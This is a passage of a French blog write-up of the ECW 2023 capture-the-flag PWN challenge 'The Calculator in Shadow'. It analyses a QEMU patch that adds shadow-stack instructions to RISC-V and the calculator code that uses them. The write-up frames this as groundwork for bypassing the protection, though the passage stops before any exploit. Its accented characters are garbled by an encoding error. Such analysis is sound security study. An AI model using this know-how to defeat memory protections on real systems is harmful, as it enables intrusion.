<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta
    name="description"
    content="Author: Kien Nguyen <kiennt2609@gmail.com>
      A minimal Hugo theme with Tailwind CSS"
  />
  <title>
    
      Blog de TaylorDeDordogne
      | The Calculator in Shadow
    
  </title>
  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
  <meta name="description" content="" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <link
    rel="icon"
    href="/favicon_io/favicon.ico"
    type="image/x-icon"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-16x16.png"
    size="16x16"
    type="image/png"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-32x32.png"
    size="32x32"
    type="image/png"
  />

  <link
    rel="preload"
    type="text/css"
    href="/css/rose-pine.min.css"
    integrity=""
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/rose-pine.min.css"
      integrity=""
    />
  </noscript><link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Overpass+Mono:wght@400;500;700&family=Overpass:wght@400;500;700&display=swap"
  rel="stylesheet"
/>
<link
    rel="preload"
    type="text/css"
    href="/css/toigian.css"
    integrity=""
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/toigian.css"
      integrity=""
    />
  </noscript>

  
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/light.css"
    integrity=""
  />
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/dark.css"
    integrity=""
  />

  <script>
    
    if (
      localStorage.theme === "dark" ||
      (!("theme" in localStorage) &&
        window.matchMedia("(prefers-color-scheme: dark)").matches)
    ) {
      document.documentElement.classList.add("dark");
    } else {
      document.documentElement.classList.remove("dark");
    }
  </script>

  
  
  <script
    async
    defer
    src="/js/main.js"
    integrity=""
  ></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
  <script>
    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
  </script>
  
  
</head>
<body><header style="--layer: 10">
  <div
    aria-hidden="true"
    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
  ></div>

  <div
    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
  ><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write Ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/the-calculator-in-shadow/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">The Calculator in Shadow</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="http://localhost:1313//index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


</div>
</header>
<main class="flex justify-center px-page-gutter py-page-top">
      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write Ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/the-calculator-in-shadow/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">The Calculator in Shadow</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="http://localhost:1313//index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


<article>
  <h1>The Calculator in Shadow</h1>
  <time class="text-sm italic tabular-nums text-muted"
  >2023/10/25&nbsp;</time
>

  

  
    <div class="section">
      
        
        <a href="/tags/pwn/" id="tag">PWN</a>
      
        
        <a href="/tags/ecw-2023/" id="tag">ECW 2023</a>
      
    </div>
  


<div id="toc">
  
    
      <details open>
        <summary>Table of contents</summary>
        <div id="toc-list"><nav id="TableOfContents">
  <ol>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#prise-en-main-du-challenge">Prise en main du challenge</a></li>
    <li><a href="#analyse-du-code">Analyse du code</a>
      <ol>
        <li><a href="#analyse-du-patch-qemu">Analyse du patch qemu</a>
          <ol>
            <li><a href="#analyse-de-linstruction-dusk">Analyse de l&rsquo;instruction &ldquo;dusk&rdquo;</a></li>
            <li><a href="#analyse-de-linstruction-obscure">Analyse de l&rsquo;instruction &ldquo;obscure&rdquo;</a></li>
            <li><a href="#analyse-du-patch-de-linstruction-jalr">Analyse du patch de l&rsquo;instruction &ldquo;jalr&rdquo;</a></li>
          </ol>
        </li>
        <li><a href="#analyse-du-code-1">Analyse du code</a></li>
        <li><a href="#bypass-de-la-shadow-stack">Bypass de la shadow stack</a></li>
      </ol>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ol>
</nav></div>
      </details>
    
  
</div>
<div class="content"><h2 id="introduction">Introduction</h2>
<p>J&rsquo;ai eu la chance de pouvoir participer aux qualifications de l&rsquo;ECW 2023 durant lequel j&rsquo;ai pu flag un challenge de PWN super int√©ressant propos√© par Thales, j&rsquo;en fait donc un write-up histoire de montrer de quoi il s&rsquo;agissait üòâ. L&rsquo;objectif √©tait d&rsquo;exploiter un binaire <code>RISC-V</code> impl√©mentant des fonctionalit√©s de s√©curit√©s additionnelles mises en place par l&rsquo;interm√©diaire d&rsquo;un patch de qemu. Commen√ßons tout de suite!</p>
<h2 id="prise-en-main-du-challenge">Prise en main du challenge</h2>
<p>L&rsquo;√©nonc√© se pr√©sentait comme ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ALICE has a secret: it is not really good at mental calculations. However,
</span></span><span class="line"><span class="cl"> fret not, since ALICE solved the issue by emulating a RISCV 64-bit proces
</span></span><span class="line"><span class="cl">sor, and running a custom calculator on top of it.We think that we may gai
</span></span><span class="line"><span class="cl">n some way to fight ALICE by exploiting its calculator, so we secured an a
</span></span><span class="line"><span class="cl">ccess to it! We also got a leak of the source, you will therefore find it 
</span></span><span class="line"><span class="cl">attached. Hey, aren&#39;t we efficient? Now&#39;s your turn to act! However it see
</span></span><span class="line"><span class="cl">ms ALICE doesn&#39;t emulate a standard RISCV 64-bit processor, but added an o
</span></span><span class="line"><span class="cl">bscure thing to it. There are, consequently, custom instructions in the ca
</span></span><span class="line"><span class="cl">lculator code. Well, now that seems very shady...
</span></span></code></pre></div><p>Ok, donc on va devoir travailler sur du RISC-V, avec ceci nous √©tait fourni une archive contenant les sources du challenge, des version d√©j√† compil√©es ainsi qu&rsquo;un README tr√®s d√©taill√© nous donnant un lien vers une image docker contenant d√©j√† l&rsquo;installation qemu n√©cessaire pour nous √©viter de nous prendre la t√™te et c&rsquo;est tr√®s sympa de la part des devs üòÖ. On peut donc lancer le programme comme ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">~/qemu/build/qemu-riscv64 -L ~/riscv/sysroot ~/calculator/build/bin/calculator
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; 3 * (2 + 1)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Result: 9
</span></span></code></pre></div><p>La calculatrice se lance bien, on va plonger dans le code fourni en qu√™te de vuln√©rabilit√©s √† exploiter üïµ, et dans un premier temps on va s&rsquo;int√©resser au patch de qemu.</p>
<h2 id="analyse-du-code">Analyse du code</h2>
<h3 id="analyse-du-patch-qemu">Analyse du patch qemu</h3>
<p>En plus des fichiers sources de la calculatrice, venaient deux fichiers de patchs: <code>qemu.diff</code> et <code>binutils.diff</code> ayant pour objectif d&rsquo;impl√©menter deux nouvelles instructions √† l&rsquo;ISA RISC-V: <code>obscure &lt;rx&gt;</code> et <code>dusk &lt;rx&gt;</code>. On va commencer par s&rsquo;int√©resser √† la premi√®re instruction.</p>
<h4 id="analyse-de-linstruction-dusk">Analyse de l&rsquo;instruction &ldquo;dusk&rdquo;</h4>
<p>Voil√† le code de la fonction <code>trans_dusk</code> qui est appell√©e √† chaque fois que l&rsquo;instruction est ex√©cut√©e par le processeur √©mul√© par QEMU.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// qemu.diff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">riscv</span><span class="o">/</span><span class="n">insn_trans</span><span class="o">/</span><span class="n">trans_shadow</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">inc</span> <span class="n">b</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">riscv</span><span class="o">/</span><span class="n">insn_trans</span><span class="o">/</span><span class="n">trans_shadow</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">inc</span>
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="n">file</span> <span class="n">mode</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="mf">0000000000..8</span><span class="n">d98f413bb</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">riscv</span><span class="o">/</span><span class="n">insn_trans</span><span class="o">/</span><span class="n">trans_shadow</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">inc</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span> <span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">27</span> <span class="err">@@</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="k">static</span> <span class="kt">bool</span> <span class="nf">trans_dusk</span><span class="p">(</span><span class="n">DisasContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">arg_dusk</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv_i32</span> <span class="n">csr_darkpage</span> <span class="o">=</span> <span class="nf">tcg_constant_i32</span><span class="p">(</span><span class="n">CSR_DARKPAGE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">gen_helper_csrw</span><span class="p">(</span><span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkpage</span><span class="p">,</span> <span class="nf">get_gpr</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">a</span><span class="o">-&gt;</span><span class="n">rs1</span><span class="p">,</span> <span class="n">EXT_NONE</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv_i32</span> <span class="n">csr_darkoff</span> <span class="o">=</span> <span class="nf">tcg_constant_i32</span><span class="p">(</span><span class="n">CSR_DARKOFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv</span> <span class="n">zero</span> <span class="o">=</span> <span class="nf">tcg_constant_tl</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">gen_helper_csrw</span><span class="p">(</span><span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkoff</span><span class="p">,</span> <span class="n">zero</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span></code></pre></div><p>Pour mieux comprendre ce que fait ce code, on peut se r√©ferrer √† la documentation frontend de Qemu <a href="https://wiki.qemu.org/Documentation/TCG/frontend-ops">ici</a>.</p>
<p>Dans le contexte de la fonction <code>trans_dusk</code>, la variable <code>a-&gt;rs1</code> d√©signe le registre associ√© au premier argument, la fonction va donc √©crire la valeur pass√©e dans le premier registre dans un <code>Registre de Status et de Control</code> nomm√© <code>CSR_DARKPAGE</code> initialis√© un peu plus haut dans le code. Ce registre de contr√¥le permet d&rsquo;interagir avec une variable globale nomm√©e <code>dark_page</code> de type <code>target_ulong</code> (64 bits dans notre cas) comme on peut le voir ci-desous:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// qemu.diff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">@@</span> <span class="o">-</span><span class="mi">4028</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">4066</span><span class="p">,</span><span class="mi">10</span> <span class="err">@@</span> <span class="n">riscv_csr_operations</span> <span class="n">csr_ops</span><span class="p">[</span><span class="n">CSR_TABLE_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="cm">/* Crypto Extension */</span>
</span></span><span class="line"><span class="cl">     <span class="p">[</span><span class="n">CSR_SEED</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;seed&#34;</span><span class="p">,</span> <span class="n">seed</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">rmw_seed</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="cm">/* Shadow Extension */</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">[</span><span class="n">CSR_DARKPAGE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;vdarkpage&#34;</span><span class="p">,</span> <span class="n">shadow</span><span class="p">,</span> <span class="n">read_dark_page</span><span class="p">,</span> <span class="n">write_dark_page</span><span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="p">[</span><span class="n">CSR_DARKOFF</span><span class="p">]</span>  <span class="o">=</span> <span class="p">{</span><span class="s">&#34;vdarkoff&#34;</span><span class="p">,</span> <span class="n">shadow</span><span class="p">,</span> <span class="n">read_dark_offset</span><span class="p">,</span> <span class="n">write_dark_offset</span><span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="k">static</span> <span class="n">RISCVException</span> <span class="nf">read_dark_page</span><span class="p">(</span><span class="n">CPURISCVState</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="kt">int</span> <span class="n">csrno</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                                     <span class="n">target_ulong</span> <span class="o">*</span><span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">dark_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">return</span> <span class="n">RISCV_EXCP_NONE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="k">static</span> <span class="n">RISCVException</span> <span class="nf">write_dark_page</span><span class="p">(</span><span class="n">CPURISCVState</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="kt">int</span> <span class="n">csrno</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                                      <span class="n">target_ulong</span> <span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">env</span><span class="o">-&gt;</span><span class="n">dark_page</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">return</span> <span class="n">RISCV_EXCP_NONE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span></code></pre></div><p>La variable est initialis√©e avec la valeur du registre pass√© en argument de l&rsquo;instruction dusk. Un autre CSR nomm√© <code>CSR_DARKOFF</code> va √™tre associ√© √† une autre varaible nomm√©e variable <code>dark_offset</code> qui est de type <code>uint16_t</code> et est initialis√©e √† 0. Cette instruction est execut√©e une seule fois dans le programme de la calculatrice, dans la fonction <code>blue_hour</code> qui est appell√©e au tout d√©but du programme:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// calculator/src/shadow.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">blue_hour</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cp">#ifndef SUNBATH
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_POPULATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">page</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">error</span><span class="p">(</span><span class="n">ERROR_DUSK_MMAP</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s">&#34;dusk %0&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="s">&#34;r&#34;</span> <span class="p">(</span><span class="n">page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">}</span>
</span></span></code></pre></div><p>Ok donc la fonction <code>blue_hour</code> va donc allouer avec mmap 64 * 1024 octets (16 pages) et passer l&rsquo;adresse retourn√©e √† l&rsquo;instruction dusk qui va la garder dans la variable dark_page de QEMU. On note que la variable dark_offset est quant √† elle mise √† 0.</p>
<h4 id="analyse-de-linstruction-obscure">Analyse de l&rsquo;instruction &ldquo;obscure&rdquo;</h4>
<p>On peut maintenant s&rsquo;int√©resser √† la fonction <code>trans_obscure</code> qui est appell√©e √† chaque fois que l&rsquo;√©mulateur ex√©cutera l&rsquo;instruction obscure:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// qemu.diff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span><span class="k">static</span> <span class="kt">bool</span> <span class="nf">trans_obscure</span><span class="p">(</span><span class="n">DisasContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">arg_obscure</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv</span> <span class="n">dark_offset</span> <span class="o">=</span> <span class="nf">tcg_temp_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv_i32</span> <span class="n">csr_darkoff</span> <span class="o">=</span> <span class="nf">tcg_constant_i32</span><span class="p">(</span><span class="n">CSR_DARKOFF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">gen_helper_csrr</span><span class="p">(</span><span class="n">dark_offset</span><span class="p">,</span> <span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkoff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv</span> <span class="n">darkest_address</span> <span class="o">=</span> <span class="nf">get_darkest_address</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv</span> <span class="n">saved_data</span> <span class="o">=</span> <span class="nf">get_gpr</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">a</span><span class="o">-&gt;</span><span class="n">rs1</span><span class="p">,</span> <span class="n">EXT_NONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">tcg_gen_qemu_st_tl</span><span class="p">(</span><span class="n">saved_data</span><span class="p">,</span> <span class="n">darkest_address</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">mem_idx</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                       <span class="n">MO_ALIGN</span> <span class="o">|</span> <span class="n">MO_TE</span> <span class="o">|</span> <span class="nf">size_memop</span><span class="p">(</span><span class="nf">get_xlen_bytes</span><span class="p">(</span><span class="n">ctx</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">tcg_gen_addi_tl</span><span class="p">(</span><span class="n">dark_offset</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">,</span> <span class="nf">get_xlen_bytes</span><span class="p">(</span><span class="n">ctx</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">gen_helper_csrw</span><span class="p">(</span><span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkoff</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span></code></pre></div><p>Cette fonction fonctionne de mani√®re assez similaire √† la pr√©c√©dente et va r√©cup√©rer la valeur du premier registre pass√© en argument gr√¢ce √† la fonction <code>get_gpr</code> et la stocker √† l&rsquo;adresse <code>dark_page + dark_offset</code>, la derni√®re place non occup√©e dans la dark_page est r√©cup√©r√©e avec la fonction <code>get_darkest_address</code> comme on peut le voir ici:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// qemu.diff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span><span class="k">static</span> <span class="n">TCGv</span> <span class="nf">get_darkest_address</span><span class="p">(</span><span class="n">DisasContext</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="n">TCGv</span> <span class="n">dark_offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv</span> <span class="n">dark_page</span> <span class="o">=</span> <span class="nf">tcg_temp_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv_i32</span> <span class="n">csr_darkpage</span> <span class="o">=</span> <span class="nf">tcg_constant_i32</span><span class="p">(</span><span class="n">CSR_DARKPAGE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">gen_helper_csrr</span><span class="p">(</span><span class="n">dark_page</span><span class="p">,</span> <span class="n">cpu_env</span><span class="p">,</span> <span class="n">csr_darkpage</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="n">TCGv</span> <span class="n">darkest_address</span> <span class="o">=</span> <span class="nf">tcg_temp_new</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="nf">tcg_gen_add_tl</span><span class="p">(</span><span class="n">darkest_address</span><span class="p">,</span> <span class="n">dark_page</span><span class="p">,</span> <span class="n">dark_offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">return</span> <span class="n">darkest_address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span><span class="p">}</span>
</span></span></code></pre></div><p>Par ailleurs la fonction <code>get_xlen_bytes</code> retourne simplement le nombre de bits de l&rsquo;architecture convertit en octets (8 en l&rsquo;occurence). L√† o√π ca devient int√©ressant c&rsquo;est o√π cette instruction est execut√©e:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// calculator/include/shadow.h
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define IN_SHADOW \
</span></span></span><span class="line"><span class="cl"><span class="cp">  asm volatile(   \
</span></span></span><span class="line"><span class="cl"><span class="cp">    &#34;obscure ra&#34;  \
</span></span></span><span class="line"><span class="cl"><span class="cp">  );
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// calculator/src/calc.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">error_kind</span> <span class="nf">secure_calc</span> <span class="p">(</span><span class="kt">char</span> <span class="n">input</span><span class="p">[],</span> <span class="kt">node_t</span><span class="o">*</span> <span class="n">node_root</span><span class="p">,</span> <span class="kt">int64_t</span><span class="o">*</span> <span class="n">result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">IN_SHADOW</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">MAX_OPS</span> <span class="o">&lt;</span> <span class="nf">count_ops</span><span class="p">(</span><span class="n">input</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ERROR_OPS_LIMIT</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
